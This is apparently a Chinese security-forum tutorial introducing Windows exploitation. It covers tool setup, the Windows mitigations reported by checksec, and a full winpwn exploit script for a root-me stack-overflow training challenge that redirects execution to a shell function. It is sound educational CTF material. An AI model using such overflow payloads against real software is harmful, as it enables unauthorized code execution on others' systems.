win pwn初探（一）

[![img](https://xz.aliyun.com/assets/pc/images/pic_default_secret.png) z1r0 发表于 江苏](https://xz.aliyun.com/users/122872) [技术文章](https://xz.aliyun.com/news?cate_id=9) 8708浏览 · 2022-11-20 20:28

> 一直都感觉win pwn很难所以就没接触过，但是看了一些CVE之后还有ZDI最近公布的一些CVE，发现win/软件上的漏洞占比要比linux上的占比多很多，所以打算从最基础的开始学习并记录一下学习过程。笔者在这win pwn方面纯属小白，如有错误欢迎指正

# win pwn初探（一）

## 环境搭建

首先笔者给出自己的本机环境和虚拟机环境

本机环境：m1 pro

虚拟机环境：PD 17，Windows 11 专业版-21H2

虽然是arm windows但是可以运行x32和x64的程序

### 安装checksec

这里笔者摸索了挺长时间的，winchecksec笔者因为各种各样的环境问题导致没有安装成功，但是笔者找到了一个在win上可以直接checksec的[github项目](https://github.com/Wenzel/checksec.py)，只需要去它的[releases](https://github.com/Wenzel/checksec.py/releases)下载[checksec.exe](https://github.com/Wenzel/checksec.py/releases/download/v0.6.2/checksec.exe)即可。

### 安装winpwn

这个就和linux下的pwntools类似，[使用地址](https://github.com/byzero512/winpwn)，安装的话直接执行以下命令即可

- pip3 install winpwn
- pip3 install pefile
- pip3 install keystone-engine
- pip3 install install capstone

安装完成之后就可以`from winpwn import *`了

### 安装windbg

其实可以直接用ollydbg、x32dbg、x64dbg，但是笔者看见很多win上CVE复现都用的是windbg，所以笔者也去装了一个

直接去windows的store商店搜索windbg，直接点击安装即可

笔者学到目前为止只用到了上面的这三个工具，后续用到其他的话就继续添加吧

## winpwn保护机制

win上的保护要比linux上的保护多上很多，这里笔者写了一个测试程序然后使用vs2022 preview默认编译成x64的exe

```
# include <stdio.h>

int main(int argc, char** argv) {
    printf("hello world");
    return 0;
}
```

`.\checksec.exe 目标程序`就可以看见目标程序的保护机制

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221120202404-3919c0ee-68ce-1.png)

NX：这个在win上其实是DEP，堆栈不可执行保护

Canary：这个在win上其实是GS，可能这个工具的开发者为了让我们更好理解才写了Canary，但是需要注意的是这个工具的canary检测可能检测不准

ASLR：通俗讲就是地址随机化，让exe和dll的地址全部随机，所以就有了大名鼎鼎**Heap Spray**（堆喷）利用技术，Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。

Dynamic Base：程序编译时可通过/DYNAMICBASE编译选项指示程序是否利用ASLR的功能

High Entropy VA：如果指定此选项，则当内核将进程的地址空间布局随机化为 ASLR 的一部分时，兼容版本的 Windows 内核可以使用更高的熵。 如果内核使用更高的熵，则可以将更多的地址分配给堆栈和堆等内存区域。 因此，更难猜测特定内存区域的位置。当该选项打开时，当这些模块作为 64 位进程运行时，目标可执行文件和它所依赖的任何模块必须能够处理大于 4 GB 的指针值。

SEH：结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术。SEH 是 Windows操作系统的一种系统机制，本身与具体的程序设计语言无关。SEH 为Windows的设计者提供了程序错误或异常的处理途径，使得系统更加健壮

SafeSEH：为了防止攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击，在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠，立即终止异常处理函数的调用。不过SafeSEH需要编译器和系统双重支持，缺少一个则保护能力基本就丧失了

Force Integrity：强制签名保护

Control Flow Guard：控制Flow防护 (CFG) 是一项高度优化的平台安全功能，旨在打击内存损坏漏洞。 通过严格限制应用程序可以从何处执行代码，利用漏洞（如缓冲区溢出）执行任意代码会更加困难

Isolation：隔离保护，默认会开启

Authenticode：签名保护

以上是checksec的每个保护机制的简要解释，看到这里可能还会迷迷糊糊的，后续的win pwn文章利用会有绕过这些保护，到时候会详细的解释，包括什么是TIB，TEB等

## 初探栈溢出

这里用比较经典的`root-me PE32 - Stack buffer overflow basic`win pwn题来上手熟悉一下

[题目地址](https://www.root-me.org/zh/挑战/应用程序-系统/PE32-Stack-buffer-overflow-basic)，题目也给出了源码

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>

#define DEFAULT_LEN 16

void admin_shell(void)
{
        system("C:\\Windows\\system32\\cmd.exe");
}

int main(void)
{
        char buff[DEFAULT_LEN] = {0};

        gets(buff);
        for (int i = 0; i < DEFAULT_LEN; i++) {
                buff[i] = toupper(buff[i]);
        }
        printf("%s\n", buff);
}
```

### checksec

将程序利用scp下载到本地，然后checksec看一下保护机制

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221120202436-4c0b38cc-68ce-1.png)

上面显示开了Canary，但是在ida分析的时候是没有开canary的

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[15]; // [esp+0h] [ebp-14h] BYREF
  char v5; // [esp+Fh] [ebp-5h]
  int i; // [esp+10h] [ebp-4h]

  memset(buf, 0, sizeof(buf));
  v5 = 0;
  gets(buf);
  for ( i = 0; i < 16; ++i )
    buf[i] = toupper(buf[i]);
  printf("%s\n", buf);
  return 0;
}
```

笔者修了一下之后ida分析结果最后如上

这个程序意思就是输入buf，然后把buf的小写字母转换成大写字母最后输出出来，但是gets的话会导致栈溢出漏洞

现在我们以linux平台下的攻击思路来的话就是一个ret2text，后门地址是0x401000

```
.text:00401000                               ;org 401000h
.text:00401000                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000 55                            push    ebp
.text:00401001 8B EC                         mov     ebp, esp
.text:00401003 68 00 B0 41 00                push    offset aCWindowsSystem          ; "C:\\Windows\\system32\\cmd.exe"
.text:00401008 E8 BF 2B 00 00                call    sub_403BCC
.text:00401008
.text:0040100D 83 C4 04                      add     esp, 4
.text:00401010 5D                            pop     ebp
.text:00401011 C3                            retn
```

ida分析之后发现偏移为0x14，所以`payload = b'a' * (0x14 + 4) + p32(0x401000)`

![img](https://xzfile.aliyuncs.com/media/upload/picture/20221120202453-560a570e-68ce-1.png)

发送过去之后成功的劫持了程序流到后门地址上，成功获取一个shell

最终exp

```
from winpwn import *
from time import *

context.log_level='debug'
context.arch='i386'

file_name = './ch72.exe'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

debug = 0
if debug:
    r = remote()
else:
    r = process(file_name)

payload  = 'a' * (0x14 + 4)
payload += p32(0x401000)
r.sendline(payload)
sleep(1)
r.sendline('calc')

r.interactive()
```

## 总结

这篇初探文章只是简单的了解了windows下的保护机制，和winpwn的一个用法，后续会学习如何调试，如何绕过这些保护，包括如何用pwntools来写exp

## Reference

http://blog.chinaunix.net/uid-24917554-id-3492618.html

https://www.jianshu.com/p/4f89f810d98e